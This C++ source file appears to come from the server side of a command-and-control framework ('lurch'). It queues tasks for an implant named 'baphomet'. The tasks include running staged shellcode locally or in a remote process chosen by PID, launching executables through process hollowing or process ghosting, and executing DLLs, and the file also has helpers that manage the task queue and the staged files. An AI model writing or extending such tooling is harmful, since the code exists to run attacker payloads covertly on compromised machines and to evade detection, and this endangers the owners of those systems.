//
// Created by diago on 2024-06-06.
//

#include "baphomet.hpp"
#include "../../components/instance.hpp"


lurch::result<std::string>
lurch::baphomet::runshellcode(const command &cmd) {

    const auto [file_name, local, pid] =
        cmd.get<std::string>("--staged-file", "-sf")
            .with<empty>("--local", "-l")
            .with<int64_t>("--pid", "-p")
            .done();

    if(!file_is_staged(*file_name)) {
        return error("that file has not been staged.");
    }

    if((local && pid) || (!local && !pid)) {
        return error("Please specify either local execution or a remote process' PID.");
    }

    if(pid && *pid < 0) {
        return error("please specify a valid PID.");
    }

    std::vector<std::string> queue_args;
    std::string queue_msg;
    pid
      .and_then([&](int64_t exists) {
        queue_args = {*file_name, std::to_string(exists)};
        queue_msg  = "Queued shellcode to be ran in a remote process.";
        return std::optional(exists);
      })
      .or_else([&] {
        queue_args = {*file_name, "local"};
        queue_msg  = "Queued shellcode to be ran locally.";
        return std::optional<int64_t>(std::nullopt);
      });

    return generic_queue_task(cmd, queue_args, queue_msg);
}


lurch::result<std::string>
lurch::baphomet::runexe(const command &cmd) {

    const auto [file_name, hollow, ghost] =
    cmd.get<std::string>("--staged-file", "-sf")
        .with<empty>("--hollow", "-h")
        .with<empty>("--ghost", "-g")
        .done();

    std::string type;
    if((hollow && ghost) || (!hollow && !ghost) ) {
        return error("Please specify either hollowing or ghosting.");
    }

    if(file_name->find_first_of('.') == std::string::npos) {
        return error("invalid file name.");
    }

    if(!file_is_staged(*file_name)) {
        return error("this file has not been staged.");
    }

    hollow
        .and_then([&](empty exists) {
            type = "hollow";
            return std::optional(exists);
        })
        .or_else([&] {
            type = "ghost";
            return std::optional<empty>(std::nullopt);
        });

    return delimit_command({"runexe", *file_name, type})
        .and_then([&](std::string task_string) {
            tasks.push(task_string);
            return result<std::string>("queued executable to be ran:" + file_name.value());
        })
        .or_else([&](std::string err) {
            return result<std::string>(error(err));
        });
}


lurch::result<std::string>
lurch::baphomet::rundll(const command &cmd) {

    const std::string file_name = std::get<0>(cmd.get<std::string>("--staged-file", "-sf").done()).value();
    if(!file_is_staged(file_name)) {
        return error("that file has not been staged.");
    }

    return generic_queue_task(
        cmd,
        { file_name },
        "Successfully queued DLL to be executed."
    );
}


lurch::result<std::string>
lurch::baphomet::print_tasks() const {

    //
    // std::queue does not have iterators.
    // we need to create a copy and pop each element one by one.
    //

    std::queue copy_queue(tasks);
    std::string buff;

    while(!copy_queue.empty()) {
        buff += copy_queue.front() + '\n';
        copy_queue.pop();
    }

    if(buff.empty()) {
        return error("no tasks available.");
    }

    buff.pop_back();
    return { buff };
}


lurch::result<std::string>
lurch::baphomet::generic_queue_task(
        const command &cmd,
        std::vector<std::string> args,
        const std::string &queue_message
    ) {

    args.insert(args.begin(), cmd.name);
    return delimit_command(args)
        .and_then([&](std::string task_str) {
            tasks.push(task_str);
            return result<std::string>(queue_message);
        })
        .or_else([&](std::string err) {
            return result<std::string>(error(err));
        });
}


lurch::result<std::string>
lurch::baphomet::print_staged_files() const {

    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
        std::string result;
        for(const auto& path : *file_list) {
            result += path.string() + '\n';
        }

        result.pop_back(); //remove trailing \n char
        return { result };
    }
    else {
        return file_list.error();
    }
}


lurch::result<std::string>
lurch::baphomet::clear_tasks() {
    if(tasks.empty()) {
        return error("no tasks exist");
    }

    while(!tasks.empty())
        tasks.pop();

    return { "cleared tasks." };
}


bool
lurch::baphomet::file_is_staged(const std::string &file_name) const {

    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
        for(const auto& file : *file_list) {
            if(file_name == file) {
                return true;
            }
        }
    }

    return false;
}


lurch::result<std::string>
lurch::baphomet::get_task() const {
    if(tasks.empty()) {
        return error("no tasks available.");
    }

    const std::string task = tasks.front();
    return { task };
}


lurch::result<std::string>
lurch::baphomet::complete_task(const command &cmd) {
    if(tasks.empty()) {
        return error("no tasks to be completed.");
    }

    tasks.pop();
    return OBJECT_EMPTY_RESPONSE;
}


lurch::result<std::string>
lurch::baphomet::delimit_command(const std::vector<std::string> &strings) {

    std::string buff;
    for(const auto& str : strings) {
        if(str.find_first_of(AGENT_DELIMITING_CHAR) != std::string::npos) {
            return error("couldn't format command, invalid character used.");
        }

        buff += str + AGENT_DELIMITING_CHAR;
    }

    return { buff };
}